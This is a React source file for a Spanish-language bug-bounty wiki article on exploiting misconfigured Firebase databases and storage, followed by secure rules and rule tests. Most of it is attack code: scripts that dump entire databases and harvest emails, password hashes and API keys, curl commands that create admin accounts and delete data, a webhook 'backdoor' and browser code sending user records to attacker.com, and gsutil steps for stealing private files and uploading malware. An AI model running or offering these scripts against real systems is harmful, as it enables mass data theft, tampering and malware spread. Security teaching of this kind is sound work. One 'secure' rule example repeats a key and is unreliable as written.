/**
 * FIREBASE MISCONFIGURATION
 * Explotar bases de datos Firebase sin autenticación
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Flame, Database, Lock, Shield, ArrowRight, ExternalLink } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function FirebaseMisconfigurationContent({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduccion" title="Firebase Realtime Database Exposed">
        <Paragraph>
          Firebase es una plataforma BaaS (Backend-as-a-Service) de Google. Su base de datos en tiempo real 
          usa <Strong>reglas de seguridad JSON</Strong> para controlar acceso. Una configuración incorrecta 
          permite que <Strong>cualquiera lea/escriba TODA la base de datos</Strong>.
        </Paragraph>

        <AlertDanger title="Estadística Alarmante">
          En 2019, un estudio encontró que <Strong>más del 10% de apps móviles con Firebase</Strong> tenían 
          bases de datos completamente abiertas, exponiendo millones de registros de usuarios.
        </AlertDanger>
      </Section>

      <Section id="identificacion" title="1. Identificar Firebase en Apps">
        <Subsection title="Encontrar URL de Firebase">
          <Paragraph>
            Las URLs de Firebase Realtime Database siguen el patrón:
          </Paragraph>

          <HighlightBox color="blue">
            <code>https://[PROJECT-ID].firebaseio.com/</code>
          </HighlightBox>

          <CodeBlock
            language="bash"
            title="Métodos de descubrimiento"
            code={`# 1. Decompile APK (Android)
apktool d app.apk
grep -r "firebaseio.com" app/

# 2. Inspeccionar JavaScript (Web Apps)
curl https://target-app.com | grep -o 'https://[^"]*firebaseio.com'

# 3. Burp Suite - Intercept traffic
# Buscar requests a *.firebaseio.com

# 4. Network tab en DevTools
# Filtrar por "firebaseio"`}
          />
        </Subsection>

        <Subsection title="Probar Acceso Directo">
          <CodeBlock
            language="bash"
            title="Verificar si está abierta"
            code={`# Intentar leer datos sin autenticación
curl 'https://PROJECT-ID.firebaseio.com/.json'

# Si retorna datos JSON = VULNERABLE
# Si retorna "Permission denied" = Protegida`}
          />

          <TerminalOutput title="Respuesta de base de datos vulnerable">
            {`{
  "users": {
    "user1": {
      "email": "victim@email.com",
      "password": "hashed_password_here",
      "credit_card": "4532-****-****-1234"
    },
    "user2": { ... }
  },
  "messages": { ... },
  "api_keys": {
    "stripe_secret": "sk_live_XXXXXXXXXXXXXXXXX"
  }
}`}
          </TerminalOutput>
        </Subsection>
      </Section>

      <Section id="explotacion" title="2. Explotación Completa">
        <Subsection title="Leer Toda la Base de Datos">
          <CodeBlock
            language="python"
            title="Script - Exfiltrar Firebase completo"
            code={`import requests
import json

FIREBASE_URL = "https://vulnerable-app.firebaseio.com"

def download_database():
    # Descargar TODA la base de datos
    response = requests.get(f"{FIREBASE_URL}/.json")
    
    if response.status_code == 200:
        data = response.json()
        
        # Guardar localmente
        with open('firebase_dump.json', 'w') as f:
            json.dump(data, f, indent=2)
        
        print(f"[+] Downloaded {len(json.dumps(data))} bytes")
        print(f"[+] Saved to firebase_dump.json")
        
        # Analizar datos sensibles
        analyze_sensitive_data(data)
    else:
        print("[-] Access denied or database not found")

def analyze_sensitive_data(data):
    # Buscar emails
    emails = find_in_dict(data, 'email')
    print(f"[+] Found {len(emails)} emails")
    
    # Buscar contraseñas
    passwords = find_in_dict(data, 'password')
    print(f"[+] Found {len(passwords)} password hashes")
    
    # Buscar API keys
    api_keys = find_in_dict(data, 'api_key')
    print(f"[+] Found {len(api_keys)} API keys")

def find_in_dict(data, key):
    results = []
    if isinstance(data, dict):
        for k, v in data.items():
            if k == key:
                results.append(v)
            results.extend(find_in_dict(v, key))
    elif isinstance(data, list):
        for item in data:
            results.extend(find_in_dict(item, key))
    return results

download_database()`}
          />
        </Subsection>

        <Subsection title="Escribir Datos Maliciosos">
          <CodeBlock
            language="bash"
            title="Inyectar datos con curl"
            code={`# Crear usuario administrador
curl -X PUT \\
  'https://vulnerable-app.firebaseio.com/users/hacker.json' \\
  -d '{
    "email": "hacker@evil.com",
    "role": "admin",
    "verified": true
  }'

# Modificar datos existentes
curl -X PATCH \\
  'https://vulnerable-app.firebaseio.com/users/user1.json' \\
  -d '{"role": "admin"}'

# Eliminar datos
curl -X DELETE \\
  'https://vulnerable-app.firebaseio.com/messages.json'`}
          />
        </Subsection>

        <Subsection title="Backdoor Persistente">
          <CodeBlock
            language="python"
            title="Crear webhook malicioso"
            code={`import requests

FIREBASE_URL = "https://vulnerable-app.firebaseio.com"
ATTACKER_WEBHOOK = "https://attacker.com/webhook"

# Crear regla de notificación que envíe todos los datos a atacante
backdoor = {
    "webhook_url": ATTACKER_WEBHOOK,
    "events": ["create", "update", "delete"],
    "active": True
}

response = requests.put(
    f"{FIREBASE_URL}/admin/webhooks/backup.json",
    json=backdoor
)

print("[+] Backdoor installed")
print("[+] All future changes will be sent to attacker webhook")`}
          />
        </Subsection>
      </Section>

      <Section id="firestore" title="3. Firestore (Cloud Firestore)">
        <Paragraph>
          Firestore es la nueva base de datos de Firebase. Usa un sistema de reglas diferente 
          pero igualmente vulnerable si está mal configurado.
        </Paragraph>

        <Subsection title="Reglas Inseguras de Firestore">
          <CodeBlock
            language="javascript"
            title="firestore.rules - VULNERABLE"
            code={`rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    // ❌ PELIGRO: Permite leer/escribir TODO
    match /{document=**} {
      allow read, write: if true;
    }
  }
}`}
          />
        </Subsection>

        <Subsection title="Explotar Firestore desde Browser">
          <CodeBlock
            language="javascript"
            title="exploit.js - Extraer colecciones"
            code={`// Necesitas el Firebase config (público en la app)
const firebaseConfig = {
  apiKey: "AIzaSyXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX",
  projectId: "vulnerable-app",
  // ... otros campos
};

firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

// Leer colección de usuarios
async function dumpUsers() {
  const usersSnapshot = await db.collection('users').get();
  
  usersSnapshot.forEach(doc => {
    console.log(doc.id, '=>', doc.data());
    // Guardar en servidor atacante
    fetch('https://attacker.com/exfil', {
      method: 'POST',
      body: JSON.stringify({
        id: doc.id,
        data: doc.data()
      })
    });
  });
}

// Crear usuario admin
async function createAdmin() {
  await db.collection('users').doc('hacker').set({
    email: 'hacker@evil.com',
    role: 'admin',
    premium: true
  });
  console.log('[+] Admin user created');
}

dumpUsers();
createAdmin();`}
          />
        </Subsection>
      </Section>

      <Section id="firebase-storage" title="4. Firebase Storage Expuesto">
        <Paragraph>
          Firebase Storage almacena archivos (imágenes, PDFs, etc). Reglas incorrectas 
          permiten acceso a archivos privados.
        </Paragraph>

        <CodeBlock
          language="javascript"
          title="storage.rules - VULNERABLE"
          code={`rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {
    // ❌ PELIGRO: Permite descargar cualquier archivo
    match /{allPaths=**} {
      allow read, write: if true;
    }
  }
}`}
        />

        <CodeBlock
          language="bash"
          title="Enumerar archivos con gsutil"
          code={`# Instalar gsutil (Google Cloud SDK)
# https://cloud.google.com/storage/docs/gsutil_install

# Listar archivos públicos
gsutil ls -r gs://vulnerable-app.appspot.com/

# Descargar archivo privado
gsutil cp gs://vulnerable-app.appspot.com/private/user_data.csv .

# Subir malware
gsutil cp malware.apk gs://vulnerable-app.appspot.com/downloads/app.apk`}
        />
      </Section>

      <Section id="mitigacion" title="Mitigación - Reglas Seguras">
        <AlertDanger title="✅ Nunca uses 'if true' en producción">
          Las reglas de Firebase deben validar autenticación y autorización adecuadamente.
        </AlertDanger>

        <Subsection title="Realtime Database - Reglas Seguras">
          <CodeBlock
            language="json"
            title="database.rules.json - ✅ SEGURO"
            code={`{
  "rules": {
    // Lectura pública solo de posts publicados
    "posts": {
      ".read": true,
      "$postId": {
        ".write": "auth != null && auth.uid == data.child('author_id').val()"
      }
    },
    
    // Usuarios solo pueden leer/escribir sus propios datos
    "users": {
      "$userId": {
        ".read": "auth != null && auth.uid == $userId",
        ".write": "auth != null && auth.uid == $userId",
        
        // Admin puede leer todo
        ".read": "root.child('admins').child(auth.uid).exists()",
        
        // Validar estructura de datos
        ".validate": "newData.hasChildren(['email', 'name'])"
      }
    },
    
    // Solo admins pueden escribir configuración
    "config": {
      ".read": true,
      ".write": "root.child('admins').child(auth.uid).exists()"
    }
  }
}`}
          />
        </Subsection>

        <Subsection title="Firestore - Reglas Seguras">
          <CodeBlock
            language="javascript"
            title="firestore.rules - ✅ SEGURO"
            code={`rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    
    // Función helper para verificar admin
    function isAdmin() {
      return get(/databases/$(database)/documents/admins/$(request.auth.uid)).data.role == 'admin';
    }
    
    // Usuarios solo acceden a sus datos
    match /users/{userId} {
      allow read, write: if request.auth != null && request.auth.uid == userId;
      allow read: if isAdmin();
      
      // Validar estructura
      allow create: if request.resource.data.keys().hasAll(['email', 'name', 'createdAt'])
                    && request.resource.data.email is string
                    && request.resource.data.email.matches('.*@.*\\\\..*');
    }
    
    // Posts públicos de lectura, autenticados para escribir
    match /posts/{postId} {
      allow read: if resource.data.visibility == 'public';
      allow read: if request.auth != null && request.auth.uid == resource.data.authorId;
      allow create: if request.auth != null 
                    && request.resource.data.authorId == request.auth.uid;
      allow update, delete: if request.auth != null 
                            && request.auth.uid == resource.data.authorId;
    }
    
    // Admin only
    match /admin/{document=**} {
      allow read, write: if isAdmin();
    }
    
    // Por defecto: denegar todo
    match /{document=**} {
      allow read, write: if false;
    }
  }
}`}
          />
        </Subsection>

        <Subsection title="Storage - Reglas Seguras">
          <CodeBlock
            language="javascript"
            title="storage.rules - ✅ SEGURO"
            code={`rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {
    
    // Archivos públicos (solo lectura)
    match /public/{allPaths=**} {
      allow read: if true;
      allow write: if false;
    }
    
    // Avatares de usuario
    match /avatars/{userId}/{fileName} {
      // Solo el owner puede leer/escribir
      allow read, write: if request.auth != null && request.auth.uid == userId;
      
      // Validar tipo de archivo
      allow write: if request.resource.contentType.matches('image/.*')
                   && request.resource.size < 5 * 1024 * 1024; // Max 5MB
    }
    
    // Documentos privados
    match /documents/{userId}/{document} {
      allow read, write: if request.auth != null && request.auth.uid == userId;
      
      // Solo PDFs permitidos
      allow write: if request.resource.contentType == 'application/pdf';
    }
    
    // Por defecto: denegar todo
    match /{allPaths=**} {
      allow read, write: if false;
    }
  }
}`}
          />
        </Subsection>
      </Section>

      <Section id="testing" title="5. Testing de Seguridad">
        <CodeBlock
          language="bash"
          title="Firebase Emulator para testing"
          code={`# Instalar Firebase CLI
npm install -g firebase-tools

# Inicializar emulador
firebase init emulators

# Testear reglas localmente
firebase emulators:start

# Escribir tests de reglas
firebase emulators:exec --only firestore "npm test"`}
        />

        <CodeBlock
          language="javascript"
          title="test/firestore.test.js - Unit tests de reglas"
          code={`const firebase = require('@firebase/rules-unit-testing');

describe('Firestore Security Rules', () => {
  
  it('Denegar lectura a usuarios no autenticados', async () => {
    const db = firebase.initializeTestApp({ projectId: 'test' }).firestore();
    const doc = db.collection('users').doc('user1');
    
    await firebase.assertFails(doc.get());
  });
  
  it('Permitir lectura a owner del documento', async () => {
    const db = firebase.initializeTestApp({
      projectId: 'test',
      auth: { uid: 'user1' }
    }).firestore();
    
    const doc = db.collection('users').doc('user1');
    await firebase.assertSucceeds(doc.get());
  });
  
  it('Denegar escritura a documento de otro usuario', async () => {
    const db = firebase.initializeTestApp({
      projectId: 'test',
      auth: { uid: 'user1' }
    }).firestore();
    
    const doc = db.collection('users').doc('user2');
    await firebase.assertFails(doc.set({ hacked: true }));
  });
  
});`}
        />
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Siguiente: SSRF Básico</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/ssrf-basico`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Server-Side Request Forgery 101</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
